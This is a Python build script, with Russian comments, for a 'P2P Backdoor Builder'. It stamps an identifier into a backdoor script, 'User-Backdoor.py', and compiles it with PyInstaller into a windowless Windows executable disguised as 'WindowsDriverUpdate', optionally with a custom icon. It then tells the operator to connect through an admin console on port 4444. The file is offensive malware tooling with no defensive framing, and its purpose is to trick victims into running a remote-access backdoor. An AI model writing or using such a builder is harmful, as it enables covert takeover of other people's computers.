import PyInstaller.__main__
import os
import platform
import re
import random
import string

def generate_identifier():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(6))

def update_identifier_in_code(identifier):
    script_name = "User-Backdoor.py"
    
    with open(script_name, 'r', encoding='utf-8') as f:
        content = f.read()
    
    old_pattern = r'def get_saved_code\(\):\s*return ".*?"'
    new_code = f'def get_saved_code():\n    return "{identifier}"'
    
    content = re.sub(old_pattern, new_code, content, flags=re.DOTALL)
    
    with open(script_name, 'w', encoding='utf-8') as f:
        f.write(content)
    
    return identifier

def build_backdoor():
    system = platform.system()
    
    if system != "Windows":
        print("This script is for Windows only!")
        return
    
    # Сохраняем в корень проекта (на уровень выше src)
    project_root = os.path.dirname(os.path.abspath(__file__))
    project_root = os.path.dirname(project_root)  # Поднимаемся на уровень выше src
    
    script_name = "User-Backdoor.py"
    output_name = "WindowsDriverUpdate"
    
    if not os.path.exists(script_name):
        print(f"Error: {script_name} not found!")
        return
    
    print("=== P2P Backdoor Builder ===")
    print("1. Auto-generate identifier")
    print("2. Enter custom identifier")
    
    choice = input("Choose option (1/2): ").strip()
    
    if choice == "1":
        identifier = generate_identifier()
        print(f"Generated identifier: {identifier}")
    elif choice == "2":
        while True:
            identifier = input("Enter 6-character identifier (letters and numbers): ").strip()
            if len(identifier) == 6 and all(c in (string.ascii_letters + string.digits) for c in identifier):
                break
            print("Invalid identifier! Must be exactly 6 characters (letters and numbers only).")
    else:
        print("Invalid choice!")
        return
    
    print(f"Updating code with identifier: {identifier}")
    update_identifier_in_code(identifier)
    
    print("Building backdoor executable...")
    
    # Путь к иконке (если существует)
    icon_path = os.path.join(project_root, "icon.ico")
    pyinstaller_args = [
        script_name,
        '--onefile',
        '--windowed',
        '--name', output_name,
        '--distpath', project_root,  # Сохраняем в корень проекта
        '--workpath', './build',
        '--specpath', './build',
        '--clean',
        '--hidden-import=zeroconf'
    ]
    
    # Добавляем иконку если файл существует
    if os.path.exists(icon_path):
        pyinstaller_args.extend(['--icon', icon_path])
        print("Using custom icon...")
    
    try:
        PyInstaller.__main__.run(pyinstaller_args)
        
        print("Build completed successfully!")
        print(f"Identifier: {identifier}:4444")
        print(f"Executable: {project_root}\\{output_name}.exe")
        print("\nAdmin can connect using: python admin-console.py IDENTIFIER:4444")
        
    except Exception as e:
        print(f"Build failed: {e}")
    
    restore_original_code()

def restore_original_code():
    script_name = "User-Backdoor.py"
    
    original_code = 'def get_saved_code():\n    return "AbC123"'
    
    with open(script_name, 'r', encoding='utf-8') as f:
        content = f.read()
    
    content = re.sub(r'def get_saved_code\(\):\s*return ".*?"', original_code, content, flags=re.DOTALL)
    
    with open(script_name, 'w', encoding='utf-8') as f:
        f.write(content)

if __name__ == "__main__":
    build_backdoor()